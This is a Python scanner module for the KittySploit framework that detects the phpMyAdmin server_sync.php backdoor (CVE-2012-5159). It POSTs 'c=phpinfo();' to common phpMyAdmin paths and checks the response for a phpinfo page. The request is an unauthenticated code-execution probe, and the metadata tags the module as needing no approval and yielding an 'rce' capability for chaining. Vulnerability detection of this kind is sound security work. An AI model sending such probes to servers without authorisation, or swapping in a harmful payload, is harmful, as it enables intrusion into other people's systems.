#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""phpMyAdmin server_sync.php backdoor (CVE-2012-5159)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'phpMyAdmin - server_sync.php Backdoor Detection (CVE-2012-5159)',
        'description': (
            'Detects CVE-2012-5159 by POSTing c=phpinfo(); to /server_sync.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'phpmyadmin', 'backdoor', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-5159',
        ],
        'cve': 'CVE-2012-5159',
    }

    def run(self):
        for base in ('/phpmyadmin', '/pma', '/mysql', ''):
            path = f'{base}/server_sync.php'
            r = self.http_request(
                method='POST',
                path=path,
                data='c=phpinfo();',
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and '<title>phpinfo()' in (r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='phpMyAdmin server_sync.php backdoor (CVE-2012-5159)',
                    path=path,
                )
                return True
        return False
